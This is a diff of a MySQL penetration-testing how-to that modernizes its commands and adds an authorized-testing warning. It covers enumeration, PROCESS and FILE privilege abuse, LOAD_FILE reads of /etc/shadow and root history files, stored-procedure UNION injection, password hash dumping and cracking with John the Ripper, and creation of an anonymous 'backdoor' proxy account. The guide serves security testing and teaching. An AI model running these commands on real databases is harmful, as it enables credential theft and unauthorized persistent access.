@@ -1,5 +1,8 @@
 *** MySQL DATABASE PENETRATION TESTING (HOW TO) ***
 
+> [!CAUTION]
+> **Authorized Security Testing Only:** Execute these enumeration, privilege-review, and credential-audit commands strictly on isolated lab environments or systems covered by explicit written authorization.
+
 =========================================================================================================
 INDEX
 =========================================================================================================
@@ -36,8 +39,8 @@ MySQL user accounts are a user name@host combinations.
 
 • ANONYMOUS user
 This is where we need to mention the infamous anonymous account. 
-An anonymous account is defined as having an empty user name (“”). 
-This means that there can be several anonymous accounts : e.g. “”@localhost, “”@”%.domain.com”, “”@”%” etc.
+An anonymous account is defined as having an empty user name (""). 
+This means that there can be several anonymous accounts : e.g. ""@localhost, ""@"%.domain.com", ""@"%" etc.
 
 • DEFINER and INVOKER security contexts
 + A stored program or view that executes in definer security context executes with the privileges of the account named by its DEFINER attribute.
@@ -368,7 +371,7 @@ On the GUI
 --------------------------------------------------
 Perform MySQL queries.
 
-pentester@KaliLinux> nmap -p 3306 192.168.0.125 --script mysql-query --script-args -query=show databases,username=root,password=
+pentester@KaliLinux> nmap -p 3306 192.168.0.125 --script mysql-query --script-args='query="SHOW DATABASES;",username=root,password='
 pentester@KaliLinux> nmap -p 3306 192.168.0.125 --script mysql-query --script-args='query="select @@version;"[,username=root,password=]'
 pentester@KaliLinux> nmap -p 3306 192.168.0.125 --script mysql-query --script-args='query="SELECT * FROM table_name WHERE (userID LIKE '%ELM%');"[,username=root,password=]'
 
@@ -393,34 +396,34 @@ This module allows for simple SQL statements to be executed against a MySQL inst
 
 * Manual checks:
 -----------------------------------------------------------------------
-mysql> SELECT user();					//Display current user
-mysql> SELECT system_user();				//Display current user
-mysql> SELECT @@version;				//Display the DB version
-mysql> SELECT @@hostname;				//Display the Hostname and IP Address
-mysql> SELECT @@datadir;				//Location of DB files	
-mysql> SELECT user FROM mysql.user;			//List Users	
-mysql> SELECT host, user, password FROM mysql.user;	//List Password Hashes
-mysql> show databases;					//List the databases
-mysql> use [databases_name]				//Select a database to use
-mysql> show tables [databases_name]			//List the tables of a database
-mysql> exit
-mysql> SELECT host, user FROM mysql.user WHERE Super_priv = 'Y'; 															 	//List DBA Accounts	
-mysql> SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'SUPER';	 	//List DBA Accounts	
-mysql> SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'FILE'; 	 	//List Accounts with FILE privilege
-mysql> SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'PROCESS'; 	//List Accounts with PROCESS privilege
-mysql> SHOW PROCEDURE STATUS;				//List stored procedures and their DEFINER
-mysql> SHOW PROCEDURE CODE proc_name
-mysql> select * from mysql.proc;
+mysql> SELECT user();                                           -- Display current user
+mysql> SELECT system_user();                                    -- Display authenticated account
+mysql> SELECT @@version;                                        -- Display DB version
+mysql> SELECT @@hostname;                                       -- Display hostname
+mysql> SELECT @@datadir;                                        -- Location of DB files
+mysql> SELECT user FROM mysql.user;                             -- List users
+mysql> SELECT host, user, plugin, authentication_string FROM mysql.user; -- List accounts and password hashes (MySQL 5.7+/8.0+; legacy 5.6 used 'password')
+mysql> SHOW DATABASES;                                          -- List databases
+mysql> USE database_name;                                       -- Select a database to use
+mysql> SHOW TABLES FROM database_name;                          -- List tables in a database
+mysql> EXIT
+mysql> SELECT host, user FROM mysql.user WHERE Super_priv = 'Y';                                                -- List DBA accounts
+mysql> SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'SUPER';     -- List SUPER privilege
+mysql> SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'FILE';      -- List FILE privilege
+mysql> SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'PROCESS';   -- List PROCESS privilege
+mysql> SHOW PROCEDURE STATUS;                                   -- List stored procedures and their DEFINER
+mysql> SHOW PROCEDURE CODE proc_name;                           -- Inspect routine bytecode (debug builds)
+mysql> SELECT routine_schema, routine_name, definer, security_type FROM information_schema.ROUTINES; -- Stored routines across MySQL 5.7+/8.0+ (legacy 5.6 used mysql.proc)
 
 Other useful commands...
-mysql> CREATE DATABASE myapp;																									//Create a database
-mysql> CREATE USER 'auditor'@'%' IDENTIFIED BY 'Welcome1';																		//Create a user
-mysql> SET PASSWORD FOR 'mysql'@'%' = PASSWORD('mysql');																		//Change a user's password
-mysql> GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, ALTER, CREATE TEMPORARY TABLES ON `myapp`.* TO 'myapp'@'localhost';	//Grant privileges to users
-mysql> FLUSH PRIVILEGES;																										//Reload the grant tables to apply GRANT changes
-mysql> mysqldump -u root -p[root_password] [database_name] > dumpfilename.sql													//Backup a database / 'Dump' a database content
-mysql> mysqldump -u root -p[root_password] --all-databases > /tmp/all-database.sql												//Backup all databases
-mysql> mysql -u root -p[root_password] [database_name] < dumpfilename.sql														//Restore a database
+mysql> CREATE DATABASE myapp;                                   -- Create a database
+mysql> CREATE USER 'auditor'@'%' IDENTIFIED BY 'Welcome1';      -- Create a lab audit user
+mysql> ALTER USER 'mysql'@'%' IDENTIFIED BY 'StrongPass_2026!'; -- Change a user password (MySQL 5.7+/8.0+; SET PASSWORD ... = PASSWORD(...) removed in 8.0)
+mysql> GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, ALTER, CREATE TEMPORARY TABLES ON `myapp`.* TO 'myapp'@'localhost'; -- Grant privileges
+mysql> FLUSH PRIVILEGES;                                        -- Reload grant tables after direct table edits
+shell> mysqldump -u root -p [database_name] > dumpfilename.sql  -- Backup a database (prompted for password)
+shell> mysqldump -u root -p --all-databases > /tmp/all-database.sql -- Backup all databases
+shell> mysql -u root -p [database_name] < dumpfilename.sql      -- Restore a database
 
 
 
@@ -470,7 +473,7 @@ Host value			User value	Connections matched by entry
 Audits MySQL database server security configuration against parts of the CIS MySQL v1.0.2 benchmark 
 (the engine can be used for other MySQL audits by creating appropriate audit files).
 
-> map -p 3306 --script mysql-audit --script-args "mysql-audit.username='root', mysql-audit.password='',mysql-audit.filename='nselib/data/mysql-cis.audit'" 192.168.1.183
+pentester@KaliLinux> nmap -p 3306 --script mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='nselib/data/mysql-cis.audit'" 192.168.1.183
 
 		PORT     STATE SERVICE
 		3306/tcp open  mysql
@@ -697,16 +700,16 @@ Any user who is allowed to execute that command might be able to see if another 
 
 * Manual check
 ----------------
-	mysql> SELECT * FROM mysql.user;								 																//List the privileges of all users
-	mysql> SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'PROCESS'; 	//List Accounts with PROCESS privilege
+	mysql> SELECT user, host, plugin, authentication_string FROM mysql.user;         -- List user accounts (MySQL 5.7+/8.0+)
+	mysql> SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'PROCESS'; -- List accounts with PROCESS privilege
 
 
 * Manual attack
 ----------------
-pentester@KaliLinux> mysqladmin -h 192.168.1.183 -u root -p processlist -i 1 --verbose			--shows the text of the currently executing queries.
+pentester@KaliLinux> mysqladmin -h 192.168.1.183 -u root -p processlist -i 1 --verbose  # Shows currently executing SQL queries
 	OR
-			  mysql> SHOW FULL PROCESSLIST		
-			  mysql> select * from INFORMATION_SCHEMA.PROCESSLIST where db = 'mysql';
+			  mysql> SHOW FULL PROCESSLIST;
+			  mysql> SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST WHERE db = 'mysql';
 			  
 
 
@@ -721,22 +724,22 @@ Recommendation: use the variable "secure_file_priv" to limit the effect of the d
 
 * Manual check:
 ----------------
-	mysql> SELECT * FROM mysql.user;								 															 //List the privileges of all users
-	mysql> SELECT host, user FROM mysql.user WHERE file_priv = 'Y'; 								 							 //List DBA Accounts	
-	mysql> SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'FILE'; 	 //List Accounts with FILE privilege
+	mysql> SELECT user, host, file_priv FROM mysql.user;                                            -- List FILE privilege per user
+	mysql> SELECT host, user FROM mysql.user WHERE file_priv = 'Y';                                -- List accounts with FILE privilege
+	mysql> SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'FILE'; -- Global FILE grants
 
 
 * Manual attack:
 ----------------
 
-Read files stored on the Linux/Windows server supporting the MySQL database (examples):
+Read files stored on the Linux/Windows server supporting the MySQL database (authorized lab examples):
 	mysql> SELECT LOAD_FILE('/etc/passwd');
 	mysql> SELECT LOAD_FILE('/root/.bash_history');
-	mysql> SELECT LOAD_FILE('/root/.my.cnf);
+	mysql> SELECT LOAD_FILE('/root/.my.cnf');
 	mysql> SELECT LOAD_FILE('/etc/shadow');
 	mysql> SELECT LOAD_FILE('/home/msfadmin/.mysql_history');
 
-	mysql> SELECT LOAD_FILE('C:\\tesfile.txt');
+	mysql> SELECT LOAD_FILE('C:\\testfile.txt');
 
   
 Upload of a Web Shell on the Linux/Windows server supporting the MySQL database (examples):
@@ -873,12 +876,12 @@ Example of normal query:
 
 * Manual checks
 ----------------
-	mysql> select * from mysql.proc  
+	mysql> SELECT routine_schema, routine_name, definer, security_type FROM information_schema.ROUTINES; -- Legacy <8.0: SELECT * FROM mysql.proc;
 
 
 * Manual attack to exploit the insecure MySQL stored procedure SP_ListDbUser
 ----------------------------------------------------------------------------
-	mysql> CALL SP_ListDbUser ('mysql.user UNION select password from mysql.user'); 
+	mysql> CALL SP_ListDbUser ('mysql.user UNION SELECT authentication_string FROM mysql.user'); -- Legacy <5.7 used password column
 
 
 
@@ -887,8 +890,8 @@ Example of normal query:
 The MySQL server authenticates client connections using authentication plugins.
 The plugin that authenticates a given connection may request that the connecting (external) user be treated as a different user for privilege-checking purposes.
 This enables the external user to be a proxy for the second user; that is, to assume the privileges of the second user:
- + The external user is a “proxy user” (a user who can impersonate or become known as another user).
- + The second user is a “proxied user” (a user whose identity and privileges can be assumed by a proxy user)
+ + The external user is a "proxy user" (a user who can impersonate or become known as another user).
+ + The second user is a "proxied user" (a user whose identity and privileges can be assumed by a proxy user)
 
 Requirements for Proxy User Support
 ------------------------------------
@@ -901,24 +904,24 @@ Requirements for Proxy User Support
    the user name of the proxied account that defines the privileges to be assumed by the proxy user.
 
    
-Example of queries to create proxy users
-----------------------------------------
-	mysql> CREATE USER ''@'%' IDENTIFIED BY 'a_password';			//Create an anonymous proxy users = backdoor ;-)
-																	//remark:  ''@'%'    =  remote or local anonymous user
-
-	mysql> GRANT PROXY ON 'root'@'localhost' TO 'auditor'@'%';						//the (remote) auditor account can impersonate the (local) root account
+Example of queries to audit or test proxy users in an isolated lab
+------------------------------------------------------------------
+	mysql> CREATE USER ''@'%' IDENTIFIED BY 'a_password';                            -- Remote/local anonymous backdoor test account
+	mysql> GRANT PROXY ON 'root'@'localhost' TO 'auditor'@'%';                      -- Auditor can impersonate local root
 	mysql> REVOKE PROXY ON root TO guest;
-	mysql> GRANT PROXY ON ''@'' TO 'auditor'@'%' WITH GRANT OPTION; 	//the auditor account has been granted the priv to manage all GRANT PROXY mappings. 		
+	mysql> GRANT PROXY ON ''@'' TO 'auditor'@'%' WITH GRANT OPTION;                 -- Grants PROXY delegation privilege
 	
 	
 * Manual check to identify proxy_users
 --------------------------------------
-	mysql> SELECT * @@proxy_user;			 //List the proxy users
+	mysql> SELECT CURRENT_USER(), USER(), @@proxy_user;                           -- List effective identity vs proxy identity
+	mysql> SELECT Host, User, Proxied_host, Proxied_user, With_grant FROM mysql.proxies_priv;
 
 
-* Manual attack (to exploit an anonymous proxy user):
------------------------------------------------------ 
-To ADD    
+* Manual audit verification (check anonymous proxy privilege abuse):
+--------------------------------------------------------------------
+	mysql> SELECT User, Host FROM mysql.user WHERE User = '';
+	mysql> SHOW GRANTS FOR ''@'%';
 
 
 
@@ -945,12 +948,12 @@ It captures challenge and response pairs that can be supplied to Cain or JtR for
 
 1. Log into the Database with an account who has 'admin' privileges
 	
-2. Dump the hashs
-	SQL> SELECT user, password FROM mysql.USER; 
+2. Dump the password hashes
+	SQL> SELECT user, host, plugin, authentication_string FROM mysql.user;   -- MySQL 5.7+/8.0+ (legacy 5.6 used password)
 
-3. Crack the password hashes using John the ripper
-	pentester@KaliLinux> john --wordlist=dico.txt --rules --format=mysql file-mysql-pwd.txt 
-	pentester@KaliLinux> john --format=mysql file-mysql-pwd.txt 
+3. Crack legacy hashes using John the Ripper (isolated audit verification)
+	pentester@KaliLinux> john --wordlist=wordlist.txt --rules --format=mysql-sha1 file-mysql-pwd.txt
+	pentester@KaliLinux> john --format=mysql-sha1 file-mysql-pwd.txt
 	pentester@KaliLinux> john --show file-mysql-pwd.txt 
 	
 
@@ -992,19 +995,18 @@ Do not ever give anyone (except the mysql root user) access to the user table in
 The encrypted password is the real password in MySQL. 
 Anyone who knows the password which is listed in the user table and has access to the host listed for the account can easily log in as that user.
 
-shell> mysql -u root -p --execute="SELECT User, Host, Password FROM mysql.user"
+shell> mysql -u root -p --execute="SELECT user, host, plugin, authentication_string FROM mysql.user"
 
 
 shell> mysql -u root mysql
-   mysql> use mysql;
+   mysql> -- Note: MySQL 5.7+/8.0+ uses ALTER USER / IDENTIFIED BY and authentication_string instead of PASSWORD() and user.password
    mysql> CREATE USER ''@'%' IDENTIFIED BY 'anonymous';
    mysql> CREATE USER ''@'' IDENTIFIED BY 'anonymous';
-   mysql> UPDATE user SET Password=PASSWORD('guest') WHERE user='guest';
-   mysql> UPDATE user SET Password=PASSWORD('new_password') WHERE user='root';
-   mysql> CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'newpass';
-   mysql> SELECT User, Host, Password FROM mysql.user;
+   mysql> ALTER USER 'guest'@'%' IDENTIFIED BY 'StrongGuest_2026!';
+   mysql> ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongRoot_2026!';
+   mysql> CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'StrongNewPass_2026!';
+   mysql> SELECT user, host, plugin, authentication_string FROM mysql.user;
    mysql> FLUSH PRIVILEGES;
-   mysql> select * from user;
 
 
  > USER(): the application user, or a combination of the application user name and the application host name.
@@ -1017,7 +1019,7 @@ if no proxying was used this is the selected authentication user account
 
 > @@PROXY_USER
 if proxying was used this is the authentication user account
-if not proxying was used it’s empty (NULL)
+if not proxying was used it's empty (NULL)
    
 Edit /etc/mysql/my.cnf, find the line which says:
 bind-address = 0.0.0.0
